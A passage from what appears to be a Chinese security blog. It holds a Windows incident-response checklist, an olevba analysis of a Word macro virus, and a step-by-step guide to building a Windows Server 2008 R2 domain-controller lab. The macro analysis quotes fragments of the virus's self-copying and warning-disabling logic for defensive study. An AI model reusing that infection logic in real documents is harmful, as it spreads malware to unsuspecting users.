<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist -m &#123;xxx.dll&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查看是否存在异常的域名-IP映射</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<h2 id="日志查看分析"><a href="#日志查看分析" class="headerlink" title="日志查看分析"></a>日志查看分析</h2><ol>
<li>安全日志查看</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; eventvwr.msc &gt; Windows日志 &gt; 安全</span><br><span class="line">登录成功：事件ID为4624、528</span><br><span class="line">登录失败：事件ID为4625、529</span><br></pre></td></tr></table></figure>

<p><a href="https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">事件id详解</a></p>
<h2 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h2><ol>
<li>自带启动项排查</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; msconfig-启动</span><br><span class="line">【开始】-【所有程序】-【启动】</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注册表启动项排查</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; regedit检查以下项</span><br><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure>

<h2 id="计划任务排查"><a href="#计划任务排查" class="headerlink" title="计划任务排查"></a>计划任务排查</h2><ol>
<li>图形化界面检查计划任务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>命令行检查计划任务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">旧版本系统使用：at</span><br><span class="line">新系统使用：schtasks</span><br></pre></td></tr></table></figure>

<h2 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h2><ol>
<li>图形化界面排查服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WIN+R &gt; services.msc</span><br></pre></td></tr></table></figure>

<h2 id="杂项（快速定位文件）"><a href="#杂项（快速定位文件）" class="headerlink" title="杂项（快速定位文件）"></a>杂项（快速定位文件）</h2><ol>
<li>定位文件路径，关键字搜索（在d盘下搜索文件名包含test的文件）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r d:\ %i in (test) do @echo %i</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查找包含关键字的文件（搜索包含test的.txt文件）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /s /m /I &quot;test&quot; *.txt</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>搜索<code>*.txt</code>文件中test关键字所在的行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /i /n &quot;test&quot; *.txt</span><br><span class="line">/i:忽略大小写。</span><br><span class="line">/n:在输出中显示行号。</span><br><span class="line">/c:&quot;string&quot;：指定要搜索的字符串。</span><br><span class="line">/s:在当前目录及其所有子目录中递归搜索匹配的文件。</span><br><span class="line">/m:只列出包含匹配关键字的文件名，而不是列出匹配的行。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒分析-分析doc宏病毒</title>
    <url>/2025/07/29/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E5%88%86%E6%9E%90doc%E5%AE%8F%E7%97%85%E6%AF%92/</url>
    <content><![CDATA[<h2 id="分析样本"><a href="#分析样本" class="headerlink" title="分析样本"></a>分析样本</h2><p>使用到python的oletools模块，输入以下命令进行模块安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">py -3 -m pip install  oletools</span><br></pre></td></tr></table></figure>

<p>提取doc文档中的宏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">olevba .\20250728151303PNpue9eq.doc</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E5%88%86%E6%9E%90doc%E5%AE%8F%E7%97%85%E6%AF%92/image-20250729020721530.png" alt="image-20250729020721530"></p>
<h2 id="分析宏"><a href="#分析宏" class="headerlink" title="分析宏"></a>分析宏</h2><p>询问ai，分析宏的功能</p>
<table>
<thead>
<tr>
<th>特征</th>
<th>代码证据</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>自动触发</strong></td>
<td><code>Document_Open()</code></td>
<td>文档打开即执行。</td>
</tr>
<tr>
<td><strong>隐藏痕迹</strong></td>
<td><code>Application.DisplayStatusBar = False</code></td>
<td>禁用状态栏，防止用户察觉。</td>
</tr>
<tr>
<td><strong>关闭安全警告</strong></td>
<td><code>Options.VirusProtection = False</code></td>
<td>禁用宏安全提示。</td>
</tr>
<tr>
<td><strong>感染模板</strong></td>
<td><code>NormalTemplate.VBProject</code></td>
<td>将病毒代码写入全局模板 <code>Normal.dot</code>，实现所有文档感染。</td>
</tr>
<tr>
<td><strong>自我复制</strong></td>
<td><code>MyCode = ... Lines(1, 20)</code> → <code>InsertLines 1, MyCode</code></td>
<td>将自身代码复制到目标模板&#x2F;文档。</td>
</tr>
<tr>
<td><strong>反调试</strong></td>
<td><code>On Error Resume Next</code></td>
<td>忽略错误，避免崩溃暴露。</td>
</tr>
</tbody></table>
<h2 id="感染逻辑"><a href="#感染逻辑" class="headerlink" title="感染逻辑"></a>感染逻辑</h2><ol>
<li>首次感染：<br>如果当前文档的宏代码前2行不是 ‘APMP 和 ‘KILL（标记），则删除目标模板&#x2F;文档的原有宏，并替换为病毒代码。</li>
<li>持久化：<br>若病毒已驻留 Normal.dot，则所有新建&#x2F;打开的文档会被自动感染。</li>
</ol>
<h2 id="病毒类型"><a href="#病毒类型" class="headerlink" title="病毒类型"></a>病毒类型</h2><p>宏病毒：经典感染式，通过Office模板传播。</p>
<p>无直接破坏性，但会污染所有文档，可能导致数据泄露或后续下载更危险的载荷。</p>
<h2 id="处置建议"><a href="#处置建议" class="headerlink" title="处置建议"></a>处置建议</h2><ol>
<li>立即隔离：</li>
</ol>
<ul>
<li>在虚拟机中打开文件，避免传播。</li>
</ul>
<ol start="2">
<li>清除病毒：</li>
</ol>
<ul>
<li>删除 Normal.dot 中的恶意宏（%APPDATA%\Microsoft\Templates\Normal.dotm）。</li>
<li>使用杀毒软件（如Windows Defender全盘扫描）。</li>
</ul>
<ol start="3">
<li>修复文档：</li>
</ol>
<ul>
<li>用 Office 的 “打开并修复” 功能清理残留宏。</li>
</ul>
<ol start="4">
<li>防措施：</li>
</ol>
<ul>
<li>启用 “禁用所有宏并发出通知”（文件 → 选项 → 信任中心）。</li>
</ul>
]]></content>
      <tags>
        <tag>病毒分析</tag>
        <tag>宏病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透-搭建win2k8r2域功能级别的单域环境</title>
    <url>/2025/09/19/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="获取系统镜像"><a href="#获取系统镜像" class="headerlink" title="获取系统镜像"></a>获取系统镜像</h2><p>在<a href="https://msdn.itellyou.cn/">msdn</a>上下载操作系统镜像，如下图获取操作系统下载链接。使用迅雷下载。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919175703776.png" alt="image-20250919175703776"></p>
<p>这里我下载的是：cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso</p>
<p>下载链接为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ed2k://|file|cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso|3368839168|D282F613A80C2F45FF23B79212A3CF67|/</span><br></pre></td></tr></table></figure>

<h2 id="安装操作系统及VMware-tools"><a href="#安装操作系统及VMware-tools" class="headerlink" title="安装操作系统及VMware tools"></a>安装操作系统及VMware tools</h2><ol>
<li>使用VMware安装虚拟机，点击文件-新建虚拟机。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919180224745.png" alt="image-20250919180224745"></li>
<li>选择典型安装，然后点击下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919180351307.png" alt="image-20250919180351307"></li>
<li>点击浏览，选择到镜像文件，然后下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919180554566.png" alt="image-20250919180554566"></li>
<li>产品密钥留空，个性化处，填写全名和密码，我这里设置全名为<code>administrator</code>，密码为<code>win2k8dc.</code>，然后点击下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919180754830.png" alt="image-20250919180754830"></li>
<li>出现弹窗，选择是。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919181046108.png" alt="image-20250919181046108"></li>
<li>填写虚拟机名称，和虚拟机存放位置。这里名称命名为<code>win2k8r2 x64 dc</code>，位置为<code>E:\My_os\domain lab</code>，然后下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919181820258.png" alt="image-20250919181820258"></li>
<li>设置磁盘大小为100g，选择将虚拟磁盘拆分成多个文件。然后下一步。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182016643.png" alt="image-20250919182016643"></li>
<li>预览配置。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182200580.png" alt="image-20250919182200580"></li>
<li>根据需要自定义硬件配置，我这里设置内存为4gb，处理器内核为8，设置好点击关闭，完成。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182336890.png" alt="image-20250919182336890"></li>
<li>开始简易安装。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182539118.png" alt="image-20250919182539118"></li>
<li>等待安装完成。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919182635566.png" alt="image-20250919182635566"></li>
<li>安装完成之后，自动打开了两个窗口，关闭即可。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919183459010.png" alt="image-20250919183459010"></li>
<li>接下来安装VMware Tools。现在在虚拟机选项卡，选择安装的选项可能是灰色的，需要我们关机，设置CD&#x2F;DVD的连接为自动检测。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919184127359.png" alt="image-20250919184127359"></li>
<li>如果还是灰色，就手动选择iso。路径在你的VMware安装路径。我这里为D:\VMware\VMware Workstation\windows.iso，记得勾选连接。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919184617570.png" alt="image-20250919184617570"></li>
<li>进入计算机，发现加载了iso。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185101318.png" alt="image-20250919185101318"></li>
<li>选择运行setup64.exe。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185217724.png" alt="image-20250919185217724"></li>
<li>加载一会后进入安装向导。直接下一步。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185418445.png" alt="image-20250919185418445"></li>
<li>选择典型安装，下一步。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185753821.png" alt="image-20250919185753821"></li>
<li>安装。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20250919185925861.png" alt="image-20250919185925861"></li>
</ol>
<p>vmware workstation 的 VMware tools 安装驱动之后鼠标无法使用，报错vmci.sys 无法验证数字签名，暂时未处理。使用另一个虚拟机继续搭建域控。结果发现另一个虚拟机已经搭建过域控了。还是得继续重装系统，重新安装VMware tools。</p>
<ol start="20">
<li>最后找到报驱动数字签名错误的解决办法。原来是要安装KB4490628、KB4474419这两个补丁。官方的补丁下载地址为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://catalog.update.microsoft.com/search.aspx?q=4490628</span><br><span class="line">https://catalog.update.microsoft.com/search.aspx?q=4474419</span><br></pre></td></tr></table></figure>
然而没这么简单，在微软官方补丁下载平台下载不了补丁了。报错如下图，最后我才在csdn上找到了这两个补丁的下载地址。</li>
</ol>
<p><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003175119303.png" alt="image-20251003175119303"><br>我已经把这两个补丁上传到github上了，大家自行获取。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/H4ckForJob/win2008r2x64Patch</span><br></pre></td></tr></table></figure>
<ol start="21">
<li>接下来就是把补丁传输到虚拟机内了，这里我使用u盘传输，安装补丁过程比较简单，双击运行就行了，这里跳过。</li>
<li>最后就是重新安装VMware tools了。步骤和上面一样。这里直接放一张安装完成后的截图。可以看到屏幕自适应了。<br><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003180231485.png" alt="image-20251003180231485"></li>
</ol>
<h2 id="搭建域控"><a href="#搭建域控" class="headerlink" title="搭建域控"></a>搭建域控</h2><ol>
<li><p>设置静态ip。先添加个网卡。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003180616868.png" alt="image-20251003180616868"></p>
</li>
<li><p>选择仅主机模式。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003180710084.png" alt="image-20251003180710084"></p>
</li>
<li><p>右下角打开“网络和共享中心”。<br> <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003180856253.png" alt="image-20251003180856253"></p>
</li>
<li><p>点击“本地连接2”，点击“属性”，点击“TCP&#x2F;IPv4”，进到ip配置页面。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181001915.png" alt="image-20251003181001915"></p>
</li>
<li><p>配置IP地址，选择“使用下面的IP地址”，配置IP地址为“10.10.10.1”，子网掩码为“255.0.0.0”，默认网关为“10.10.10.1”。配置DNS服务器，配置首选DNS服务器为“10.10.10.1”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181518750.png" alt="image-20251003181518750"><br>  打开cmd终端，输入<code>ipconfig</code>命令，查看ip地址配置情况。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181748762.png" alt="image-20251003181748762"></p>
</li>
<li><p>更改计算机名（为了后续能通过计算机名区分域控服务器），这里改为<code>win2k8dc</code>，更改完毕后，重启生效。</p>
<p>  <img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182241957.png" alt="image-20251003182241957"></p>
</li>
<li><p>在cmd窗口中输入<code>dcpromo</code>升级此服务器为域控。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181912585.png" alt="image-20251003181912585"></p>
</li>
<li><p>弹出向导，点击下一步。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003181957280.png" alt="image-20251003181957280"></p>
</li>
<li><p>选择“在新林中新建域”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182532582.png" alt="image-20251003182532582"></p>
</li>
<li><p>输入域名，这里为“test.com”。点击下一步，会进行检查，等待即可。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182713238.png" alt="image-20251003182713238"></p>
</li>
<li><p>选择林的功能级别，接着下一步。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182835196.png" alt="image-20251003182835196"></p>
</li>
<li><p>此处会自动检查DNS的配置，如果没安装DNS服务器的话，会自动勾选“DNS服务器”，单击下一步。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003182934708.png" alt="image-20251003182934708"></p>
</li>
<li><p>出现无法创建DNS服务器委派的提示，单击“是”，再单击“下一步”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003183541593.png" alt="image-20251003183541593"></p>
</li>
<li><p>出现配置目录，保持默认，接着下一步。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003183735462.png" alt="image-20251003183735462"></p>
</li>
<li><p>输入还原模式密码，这里我设置为<code>win2k8dc.</code>。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003183925750.png" alt="image-20251003183925750"></p>
</li>
<li><p>下一步，出现摘要。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184003905.png" alt="image-20251003184003905"></p>
</li>
<li><p>下一步，然后开始自动安装。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184037273.png" alt="image-20251003184037273"></p>
</li>
<li><p>最后点击完成，再重启一下就好了。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184126104.png" alt="image-20251003184126104"></p>
</li>
<li><p>重启完成后，进入操作系统，可以看到登录页面已经出现域名。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184331269.png" alt="image-20251003184331269"></p>
</li>
<li><p>进入系统之后，打开cmd，输入<code>net user /domain</code>。查看域用户，可以看到krbtgt账户。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003184455138.png" alt="image-20251003184455138"></p>
</li>
<li><p>在左下角，单击打开“服务器管理器”，选择“Active Directory用户和计算机”，看到如下界面，说明活动目录域服务搭建成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003185018162.png" alt="image-20251003185018162"></p>
</li>
</ol>
<h2 id="测试加入域"><a href="#测试加入域" class="headerlink" title="测试加入域"></a>测试加入域</h2><ol>
<li><p>这里使用win7虚拟机，测试加入域。因为我使用的是之前创建的虚拟机，这里先进行些配置。</p>
</li>
<li><p>更改administrator账户密码为<code>win7user1.</code><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003190528724.png" alt="image-20251003190528724"></p>
</li>
<li><p>更改计算机名为<code>win7user1</code>。重启生效。这里发现重启之后，账户还是admin，暂时不管了，就用这个吧，密码为<code>admin</code>。</p>
</li>
<li><p>配置静态IP地址。先添加网络适配器。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191453017.png" alt="image-20251003191453017"></p>
</li>
<li><p>仅主机模式。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191526581.png" alt="image-20251003191526581"></p>
</li>
